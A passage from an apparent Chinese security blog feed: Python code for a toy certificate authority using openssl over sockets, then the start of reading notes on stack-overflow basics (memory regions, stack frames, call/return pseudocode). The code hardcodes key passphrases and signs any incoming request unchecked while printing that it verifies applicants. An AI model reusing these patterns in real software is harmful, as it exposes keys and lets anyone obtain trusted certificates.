class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>CA_host = <span class="hljs-string">"x.x.x.x"</span><br>CA_port = <span class="hljs-number">54321</span><br>CA_download_port = <span class="hljs-number">12345</span><br>cert_num = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 根证书生成</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Gen_rootCA</span>():<br>    <span class="hljs-comment"># 生成私钥</span><br>    subprocess.run([<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'genrsa'</span>, <span class="hljs-string">'-des3'</span>, <span class="hljs-string">'-passout'</span>, <span class="hljs-string">'pass:3xsh0re'</span>, <span class="hljs-string">'-out'</span>, <span class="hljs-string">'rootCA.key'</span>, <span class="hljs-string">'2048'</span>])<br>    <span class="hljs-comment"># 指定证书主题字段信息</span><br>    subject_info = <span class="hljs-string">"/C=CN/ST=Beijing/L=Haidian/O=USTB/OU=USTB_CA/CN=USTB.CA"</span><br>    <span class="hljs-comment"># 生成自签名证书</span><br>    subprocess.run(<br>        [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'req'</span>, <span class="hljs-string">'-new'</span>, <span class="hljs-string">'-x509'</span>, <span class="hljs-string">'-passin'</span>, <span class="hljs-string">'pass:3xsh0re'</span>, <span class="hljs-string">'-key'</span>, <span class="hljs-string">'rootCA.key'</span>, <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span>, <span class="hljs-string">'-out'</span>,<br>         <span class="hljs-string">'rootCA.crt'</span>, <span class="hljs-string">'-subj'</span>, subject_info], capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]\033[0m自签名证书生成完成"</span>)<br><br><br><span class="hljs-comment"># 为申请者生成证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Sign_Cert</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_socket:<br>        CA_socket.bind((<span class="hljs-string">"0.0.0.0"</span>, CA_port))<br>        CA_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m等待客户端连接...'</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m自<span class="hljs-subst">{addr[<span class="hljs-number">0</span>]}</span>的申请者已连接'</span>)<br><br>            <span class="hljs-comment"># 生成证书号</span><br>            <span class="hljs-keyword">global</span> cert_num<br>            sig = <span class="hljs-string">f'<span class="hljs-subst">{addr[<span class="hljs-number">0</span>].replace(<span class="hljs-string">"."</span>, <span class="hljs-string">""</span>)}</span>_<span class="hljs-subst">{addr[<span class="hljs-number">1</span>]}</span>_<span class="hljs-subst">{cert_num}</span>'</span><br>            cert_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">with</span> conn:<br>                conn.settimeout(<span class="hljs-number">2</span>)<br>                csr_data = <span class="hljs-string">b''</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    <span class="hljs-keyword">try</span>:<br>                        data = conn.recv(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                            <span class="hljs-keyword">break</span><br>                        csr_data += data<br>                        <span class="hljs-keyword">pass</span><br>                    <span class="hljs-keyword">except</span> socket.timeout:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-comment"># 生成 req.csr 文件</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'req_<span class="hljs-subst">{sig}</span>.csr'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>                    csr_file.write(csr_data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m申请文件CSR接收成功'</span>)<br>                <span class="hljs-comment"># 在这里处理证书请求文件的数据</span><br>                command = [<br>                    <span class="hljs-string">'openssl'</span>, <span class="hljs-string">'x509'</span>,<br>                    <span class="hljs-string">'-req'</span>, <span class="hljs-string">'-CA'</span>, <span class="hljs-string">'./rootCA.crt'</span>,<br>                    <span class="hljs-string">'-CAkey'</span>, <span class="hljs-string">'rootCA.key'</span>,<br>                    <span class="hljs-string">'-CAcreateserial'</span>,<br>                    <span class="hljs-string">'-in'</span>, <span class="hljs-string">f'./req_<span class="hljs-subst">{sig}</span>.csr'</span>,<br>                    <span class="hljs-string">'-passin'</span>, <span class="hljs-string">'pass:3xsh0re'</span>,<br>                    <span class="hljs-string">'-out'</span>, <span class="hljs-string">f'./req_<span class="hljs-subst">{sig}</span>.crt'</span>,<br>                    <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span><br>                ]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]\033[0m正在查验申请者资质......"</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]\033[0m打印签发信息:"</span>)<br>                <span class="hljs-keyword">try</span>:<br>                    subprocess.run(command, stdout=subprocess.DEVNULL)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\033[32m[+]\033[0m来自<span class="hljs-subst">{addr[<span class="hljs-number">0</span>]}</span>的申请者的证书签署完成"</span>)<br>                <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]当前系统没有安装OpenSSL库\033[0m"</span>)<br><br>                <span class="hljs-comment"># 传送CRT</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./req_<span class="hljs-subst">{sig}</span>.crt'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        data = file.read(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                            conn.sendall(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m证书发送完成!'</span>)<br>                conn.close()<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m本次签发结束!\n-------------------------------------------------------'</span>)<br><br><br><span class="hljs-comment"># CA提供根证书下载</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Download_rootCA</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_Download_socket:<br>        CA_Download_socket.bind((<span class="hljs-string">"0.0.0.0"</span>, CA_download_port))<br>        CA_Download_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]rootCA下载端口开放中...\033[0m'</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_Download_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m自<span class="hljs-subst">{addr[<span class="hljs-number">0</span>]}</span>的下载者已连接'</span>)<br>            <span class="hljs-comment"># 传送rootCA.crt</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./rootCA.crt'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    conn.settimeout(<span class="hljs-number">2</span>)<br>                    data = file.read(<span class="hljs-number">1024</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                        conn.sendall(data)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mrootCA.crt发送完成!\n---------------------------------------------------'</span>)<br>            conn.close()<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># Client请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Request_Cert</span>(<span class="hljs-params">username, passwd</span>):<br>    <span class="hljs-comment"># 生成私钥</span><br>    command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'genrsa'</span>, <span class="hljs-string">'-des3'</span>, <span class="hljs-string">'-passout'</span>, <span class="hljs-string">f'pass:<span class="hljs-subst">{passwd}</span>'</span>, <span class="hljs-string">'-out'</span>, <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.key'</span>, <span class="hljs-string">'2048'</span>]<br>    subprocess.run(command)<br>    <span class="hljs-comment"># 生成证书请求文件CSR</span><br>    subject_info = <span class="hljs-string">f"/C=CN/ST=Beijing/L=Haidian/O=USTB_<span class="hljs-subst">{username}</span>/OU=USTBer/CN=Client_<span class="hljs-subst">{username}</span>"</span><br>    command2 = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'req'</span>, <span class="hljs-string">'-new'</span>, <span class="hljs-string">'-key'</span>, <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.key'</span>, <span class="hljs-string">'-passin'</span>, <span class="hljs-string">f'pass:<span class="hljs-subst">{passwd}</span>'</span>, <span class="hljs-string">'-out'</span>,<br>                <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.csr'</span>, <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span>, <span class="hljs-string">'-subj'</span>, subject_info]<br>    subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m已连接至CA服务器'</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m正在向CA发送签发请求.....'</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./<span class="hljs-subst">{username}</span>_req.csr'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mCSR文件发送完成!\n'</span><br>              <span class="hljs-string">'\033[32m[+]\033[0m正在等待CA签发......'</span>)<br><br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m证书<span class="hljs-subst">{username}</span>_req.crt制作完成,可在当前文件夹下查看'</span>)<br><br><br><span class="hljs-comment"># Client验证证书,若验证通过则在当前文件夹下生成服务端公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Verify</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'rootCA.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看'</span>)<br>        verify_command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'verify'</span>, <span class="hljs-string">'-CAfile'</span>, <span class="hljs-string">'./rootCA.crt'</span>, <span class="hljs-string">f'Server_req.crt'</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"OK"</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]服务器证书验证成功!\033[0m"</span>)<br>            gen_server_pk_command = [<span class="hljs-string">'openssl x509 -in Server_req.crt -pubkey -noout &gt; server_pk.pem'</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]已经在当前文件夹下生成服务端公钥server_pk.pem!\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]验证失败！！！\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># Server请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Request_Cert</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 生成私钥</span><br>        command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'genrsa'</span>, <span class="hljs-string">'-des3'</span>, <span class="hljs-string">'-passout'</span>, <span class="hljs-string">f'pass:USTBServer'</span>, <span class="hljs-string">'-out'</span>, <span class="hljs-string">f'Server_req.key'</span>, <span class="hljs-string">'2048'</span>]<br>        subprocess.run(command, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-comment"># 生成证书请求文件CSR</span><br>        subject_info = <span class="hljs-string">f"/C=CN/ST=Beijing/L=Haidian/O=USTB_Server/OU=Server/CN=USTB_Server"</span><br>        command2 = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'req'</span>, <span class="hljs-string">'-new'</span>, <span class="hljs-string">'-key'</span>, <span class="hljs-string">f'Server_req.key'</span>, <span class="hljs-string">'-passin'</span>, <span class="hljs-string">f'pass:USTBServer'</span>, <span class="hljs-string">'-out'</span>,<br>                    <span class="hljs-string">f'Server_req.csr'</span>, <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span>, <span class="hljs-string">'-subj'</span>, subject_info]<br>        subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mCSR文件生成成功!'</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]私钥生成失败!!!\033[0m"</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]查看当前系统是否安装OpenSSL库!!!\033[0m"</span>)<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m已连接至CA服务器'</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m正在向CA发送签发请求.....'</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./Server_req.csr'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mCSR文件发送完成!\n'</span><br>              <span class="hljs-string">'\033[32m[+]\033[0m正在等待CA签发......'</span>)<br><br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'Server_req.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m证书Server_req.crt制作完成,可在当前文件夹下查看'</span>)<br><br><span class="hljs-comment"># Server 请求验证客户端证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Verify</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'rootCA.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看'</span>)<br>        verify_command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'verify'</span>, <span class="hljs-string">'-CAfile'</span>, <span class="hljs-string">'./rootCA.crt'</span>, <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.crt'</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"OK"</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]目标客户端证书验证成功!\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]验证失败！！！\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CA</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[34m _   _ ____ _____ ____     ____    _    \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m| | | / ___|_   _| __ )   / ___|  / \   \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m| | | \___ \ | | |  _ \  | |     / _ \  \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m| |_| |___) || | | |_) | | |___ / ___ \ \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m\___/ |____/ |_| |____/___\____/_/   \_\ \033[0m\n'</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\t\t\t\t\033[34m-------created by 3xsh0re\033[0m"</span>)<br>    root_ca_file = Path(<span class="hljs-string">"rootCA.crt"</span>)<br>    <span class="hljs-keyword">if</span> root_ca_file.is_file():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]rootCA.crt已经生成\033[0m"</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 生成根证书</span><br>        Gen_rootCA()<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># 提交线程1的执行</span><br>        thread1 = executor.submit(Download_rootCA)<br>        <span class="hljs-comment"># 提交线程2的执行</span><br>        thread2 = executor.submit(Sign_Cert)<br>        <span class="hljs-comment"># 等待两个线程执行完成</span><br>        concurrent.futures.wait([thread1, thread2])<br><br><br><span class="hljs-comment"># Client端请求CA颁发证书</span><br>Client_Request_Cert(<span class="hljs-string">"3xsh0re"</span>, <span class="hljs-string">"123456"</span>)<br><span class="hljs-comment"># 用户验证Server</span><br><span class="hljs-comment"># Client_Verify()</span><br><br><span class="hljs-comment"># Server端请求CA颁发证书</span><br><span class="hljs-comment"># Server_Request_Cert()</span><br><span class="hljs-comment"># Server验证用户ZZR</span><br>Server_Verify(<span class="hljs-string">"3xsh0re"</span>)<br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-comment"># CA()</span><br></code></pre></td></tr></table></figure><p>下面是笔者和几个小伙伴用数字认证原理改造的一个Python聊天室项目</p><p><a href="https://github.com/REMIXXYH/ChatRoom">基于CA和SSL改造的ChatRoom</a></p><p>关于SSL/TLS我后来写了更详细的分析，<a href="https://3xsh0re.github.io/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/">点击跳转</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字认证技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔2</title>
    <link href="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/"/>
    <url>/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔2"><a href="#0Day安全软件漏洞分析第2版阅读随笔2" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔2"></a>0Day安全软件漏洞分析第2版阅读随笔2</h1><p>开启第二章的阅读，栈溢出基本原理！</p><p>程序中所使用的缓冲区可以是堆区、栈区和存放静态变量的数据区。本章主要介绍在系统栈中发生溢出的情形。</p><p>Impossible-&gt;I’m possible😎</p><span id="more"></span><h2 id="第二章-栈溢出原理与实践"><a href="#第二章-栈溢出原理与实践" class="headerlink" title="第二章-栈溢出原理与实践"></a>第二章-栈溢出原理与实践</h2><h3 id="系统栈的工作原理"><a href="#系统栈的工作原理" class="headerlink" title="系统栈的工作原理"></a>系统栈的工作原理</h3><h4 id="操作系统的内存"><a href="#操作系统的内存" class="headerlink" title="操作系统的内存"></a>操作系统的内存</h4><p>进程使用内存可以按照功能可以非常简单地分为以下4个部分（实际上的内存远没有这么简单）：</p><ul><li><p>代码区：<strong>存放二进制机器码</strong>，CPU在此处取指并执行。PE文件的代码段中包含的二进制机器码会被装入内存的代码区（.text）</p></li><li><p>数据区：存放<strong>全局变量</strong></p></li><li><p>堆区：进程可以在堆区动态地请求一定大小的内存，用完后还给堆区。<strong>动态分配和回收是堆区的特点</strong>。</p></li><li><p>栈区：用于动态存储函数之间的调用关系，以保证被调函数在返回时恢复到母函数中继续执行。</p></li></ul><h4 id="系统栈、函数栈帧"><a href="#系统栈、函数栈帧" class="headerlink" title="系统栈、函数栈帧"></a>系统栈、函数栈帧</h4><p>​首先栈是一种数据结构，这个肯定都知道啦🤣两种操作，PUSH和POP，存在栈顶TOP和栈底BASE，一般来说，TOP是动态的，BASE是静态的。</p><p>​内存中的栈区实际上就是系统栈，是系统实现的一种管理函数调用的数据结构，由系统自动维护。</p><p>​不同的操作系统在函数调用的规定上是不同的，如果要明确使用某一种调用约定，需要在函数前加上调用约定的声明。默认情况下，采用<code>_stdcall</code>这种方式。</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_10-13-07.png" class=""><p>​而函数的调用就是通过系统栈的来实现的，当一个新的函数被调用时，会为其开辟一个新的栈帧，OS会进行以下操作：</p><ol><li>按规定顺序压入函数参数</li><li>压入返回地址，一般为函数调用指令的地址</li><li>此时CPU开始读取新的代码区的指令</li><li>压入当前栈帧的栈底指针值（EBP）</li><li>EBP&lt;=ESP，此时EBP指向的内存位置存储的是源函数的栈底指针值</li><li>ESP=ESP-所需空间</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH arg3;<br>PUSH arg2;<br>PUSH arg1;<br>CALL func; //此时压入返回地址，代码区转换<br>PUSH EBP;<br>MOV  EBP,ESP;<br>SUB  ESP,EBX;//假设EBX为需要的内存大小,静态变量使用内存大小的确定在编译器编译时就已经确定了<br></code></pre></td></tr></table></figure><p>当函数调用完成时，</p><ol><li>返回值存放在EAX寄存器</li><li>ESP=ESP+占用内存大小</li><li>EBP=(EBP)</li><li>函数返回值addr弹回，EIP=addr</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADD  ESP,EBX;<br>MOV  EBP,(EBP);<br>POP  EBP;<br>RETN; <br></code></pre></td></tr></table></figure><p><a 